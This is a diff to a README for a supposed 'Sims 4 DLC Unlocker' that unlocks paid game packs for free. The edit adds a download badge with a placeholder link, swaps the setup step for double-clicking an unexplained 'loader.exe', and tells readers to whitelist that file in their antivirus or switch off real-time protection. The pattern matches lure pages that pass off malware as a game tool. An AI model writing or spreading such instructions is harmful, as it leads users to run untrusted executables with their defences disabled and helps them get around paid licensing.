@@ -1,3 +1,5 @@
+[![Download Sims 4 DLC Unlocker](https://img.shields.io/badge/Download%20Unlocker-Blue?style=for-the-badge&logo=github)](YOUR_DOWNLOAD_LINK_HERE)
+
 # The Sims 4 DLC Unlocker – The Ultimate Guide to Unlocking All Packs
 
 Tired of spending hundreds of dollars on packs? This tool unlocks everything for your legit game—Expansion Packs, Game Packs, Stuff Packs, and Kits.
@@ -22,11 +24,11 @@ Tired of spending hundreds of dollars on packs? This tool unlocks everything for
 
 2. **Download & Extract the archive** – unzip the DLC Unlocker to your PC.
 
-3. **Run the setup** – execute `setup.bat` and type `1` then press **[Enter]**.
+3. **Run the executable** – inside the extracted folder, double-click **`loader.exe`**.
 
 4. **Download the DLC files** – if you need the actual DLC content, use a compatible DLC downloader (make sure your game has been launched at least once for the tool to detect it).
 
-5. **Launch and Play** – keep the DLC Unlocker running in the background while you play, otherwise the DLCs will be disabled.
+5. **Launch and Play** – keep `loader.exe` running in the background while you play, otherwise the DLCs will be disabled.
 
 ## 🛠️ Troubleshooting Tips
 
@@ -36,7 +38,7 @@ Your EA/Origin launcher hasn't been launched at least once before. Simply launch
 
 ### ❌ Antivirus Deleted the File
 
-The tool's behavior is similar to that of a "hacktool." Add it to your antivirus exceptions or temporarily turn off real-time protection before installation.
+The tool's behavior is similar to that of a "hacktool." Add `loader.exe` to your antivirus exceptions or temporarily turn off real-time protection before installation.
 
 ### ❌ The Unlocker is Running but Items are Missing
 
